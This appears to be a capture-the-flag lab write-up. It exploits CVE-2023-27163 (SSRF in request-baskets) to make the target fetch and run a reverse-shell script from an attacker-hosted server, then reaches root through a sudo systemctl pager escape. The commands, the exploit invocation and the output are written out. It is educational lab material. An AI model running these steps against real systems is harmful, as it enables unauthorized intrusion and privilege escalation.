## Vulnerability Analysis

### CVE-2023-27163 SSRF Discovery

Searched for known vulnerabilities in request-baskets v1.2.1 and discovered:

**CVE-2023-27163** — Server-Side Request Forgery (SSRF) vulnerability in request-baskets

**Vulnerability Details:**
- Affects: request-baskets up to v1.2.1
- Type: SSRF (Server-Side Request Forgery)
- Attack Vector: HTTP basket creation with forwarding configuration
- Impact: Ability to forward requests to internal/restricted services
- Chaining: Can be chained with other vulnerabilities for RCE

**Public POC Available:** https://github.com/lukehebe/CVE-2023-27163-POC

## Exploitation

### Stage 1: Preparing the Exploit Environment

**Step 1: Downloaded POC Files**

Downloaded the public exploitation script and shell payload:
- exploit.py — Python SSRF exploitation script
- shell.sh — Reverse shell payload

**Step 2: Started Python HTTP Server**

Hosted the shell.sh file for the target to download:

```bash
python3 -m http.server 8000
```

**Step 3: Set Up Reverse Shell Listener**

Started netcat listener for incoming connection:

```bash
nc -lvnp 4444
```

### Stage 2: Exploiting SSRF to Achieve RCE

**Executing the Exploit Script:**

```bash
python3 exploit.py -t 10.129.79.137 -p 55555 -b CH3 --local-ip 10.10.14.60 --local-port 8000 --payload-file shell.sh
```

**Parameters:**
- `-t 10.129.79.137` — Target IP
- `-p 55555` — Target port
- `-b CH3` — Basket name to create
- `--local-ip 10.10.14.60` — Attacker IP for reverse shell
- `--local-port 8000` — Python server port
- `--payload-file shell.sh` — Shell script to execute

**Exploit Output:**

```
[*] Creating basket 'CH3' targeting internal endpoint: http://127.0.0.1
[+] Basket created successfully! Token: M-8D0wrZ6xfbEXKmGpUwEYa1XS_e0lQ9fexDup0-WLi6
[*] Triggering RCE on http://10.129.79.137:55555/CH3/login...
```

**How the Exploit Works:**

1. **Basket Creation** — Creates a basket via `/api/baskets/{name}` endpoint
2. **Request Forwarding Configuration** — Configures basket to forward HTTP requests to internal endpoint (127.0.0.1)
3. **Payload Download** — Target downloads shell.sh from attacker's HTTP server
4. **Shell Execution** — shell.sh executes, establishing reverse shell to attacker
5. **RCE Achieved** — Reverse shell connection established on netcat listener

## Summary & Key Takeaways

### Attack Chain

1. **Port Scanning** → Identified port 55555 running Golang HTTP server
2. **Service Identification** → Discovered request-baskets v1.2.1
3. **CVE Research** → Found CVE-2023-27163 SSRF vulnerability
4. **POC Discovery** → Located public exploitation script on GitHub
5. **Reverse Shell Setup** → Prepared HTTP server and netcat listener
6. **SSRF Exploitation** → Created basket and triggered RCE
7. **Shell Download** → Target downloaded shell.sh from attacker
8. **Initial Access** → Obtained reverse shell as puma user
9. **Shell Stabilization** → Upgraded shell for interactivity
10. **User Flag** → Captured user.txt (fa604e04ed643642****************)
11. **Sudo Enumeration** → Found systemctl NOPASSWD permission
12. **Pager Escape** → Used !/bin/bash to spawn root shell
13. **Root Access** → Achieved UID 0 privileges
14. **Root Flag** → Captured root.txt (f7ffda8634292506****************)

### Key Vulnerabilities

- **SSRF in request-baskets** — CVE-2023-27163 allows arbitrary request forwarding
- **Sudo NOPASSWD** — systemctl executable without password authentication
- **Pager Privilege Inheritance** — Pager inherits root privileges from systemctl
- **Shell Escape in Pager** — `!` command allows arbitrary shell execution
- **No Input Validation** — SSRF request forwarding not validated
- **Process Privilege Preservation** — Spawned shell retains parent's UID/GID

### Critical Details

- **request-baskets** is a legitimate tool for creating dynamic HTTP endpoints
- **SSRF vulnerability** allows forwarding requests to 127.0.0.1 (localhost)
- **systemctl status** uses a pager when output exceeds terminal height
- **Pager escape** (`!command`) is a standard feature of less/more pagers
- **Process spawning** from pager inherits parent process privileges
- **No privilege drop** occurs when systemctl spawns the pager

### Tools Used

- `nmap` — Port scanning and service enumeration
- `python3` — HTTP server for hosting payload
- `nc (netcat)` — Reverse shell listener
- `python3 exploit.py` — CVE-2023-27163 exploitation script
- `shell.sh` — Reverse shell payload (bash one-liner)
- Standard Linux commands (sudo, id, whoami, cat)

### Lessons Learned

- **SSRF chains with RCE** — SSRF can be chained with other vulnerabilities for greater impact
- **Sudo NOPASSWD is dangerous** — Always a potential privilege escalation vector
- **Pager escapes are effective** — Pagers often run with parent's privileges
- **Shell escape characters matter** — `!` in less/more provides command execution
- **Public POCs are reliable** — GitHub POCs for known CVEs work well
- **Privilege inheritance** — Child processes inherit parent's UID/GID
- **Process spawning** — Commands executed in pager run with its privileges
- **Defense-in-depth** — Multiple misconfigurations enabled full compromise
